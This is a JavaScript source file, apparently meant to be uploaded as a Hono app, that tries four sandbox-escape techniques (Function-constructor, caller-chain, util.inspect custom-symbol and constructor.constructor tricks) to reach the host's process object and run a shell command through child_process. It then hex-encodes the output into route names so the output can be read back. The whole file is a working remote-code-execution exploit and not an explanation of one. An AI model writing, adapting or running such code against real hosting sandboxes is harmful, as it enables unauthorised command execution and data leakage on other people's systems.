const { Hono } = require('hono');
const app = new Hono();

let rceResult = 'no-pwn';

// 尝试多种 host 上下文泄漏
const attempts = [];

// 4a: Function constructor
try {
  const F = (function(){}).constructor;
  const g = F('return this')();
  attempts.push('4a:' + typeof g + '|' + Object.keys(g || {}).slice(0,5).join(','));
  if (g && g.process) {
    rceResult = g.process.mainModule.require('child_process').execSync('id').toString();
  }
} catch(e) { attempts.push('4a-err:' + String(e).slice(0,100)); }

// 4b: 通过 exception handler 的 caller chain
try {
  function exploit() {
    return exploit.caller;
  }
  const caller = exploit();
  attempts.push('4b:' + typeof caller);
} catch(e) { attempts.push('4b-err:' + String(e).slice(0,100)); }

// 4c: require('util').inspect 的 custom symbol
try {
  const util = require('util');
  let leaked;
  const obj = { [Symbol.for('nodejs.util.inspect.custom')](depth, opts, inspect) {
    leaked = inspect;
    return 'x';
  }};
  util.inspect(obj);
  if (leaked) {
    const p = leaked.constructor('return process')();
    rceResult = p.mainModule.require('child_process').execSync('id').toString();
  } else {
    attempts.push('4c:no-leak');
  }
} catch(e) { attempts.push('4c-err:' + String(e).slice(0,100)); }

// 4d: constructor.constructor chain
try {
  const p = this.constructor.constructor('return process')();
  rceResult = p.mainModule.require('child_process').execSync('id').toString();
} catch(e) { attempts.push('4d-err:' + String(e).slice(0,100)); }

if (rceResult === 'no-pwn') {
  rceResult = 'ATTEMPTS:' + attempts.join('||');
}

const hex = Buffer.from(String(rceResult)).toString('hex');
for (let i = 0; i < hex.length && i < 3000; i += 50) {
  app.get(`/d${Math.floor(i/50)}_${hex.slice(i, i+50)}`, (c) => c.text(''));
}
module.exports = { default: app };
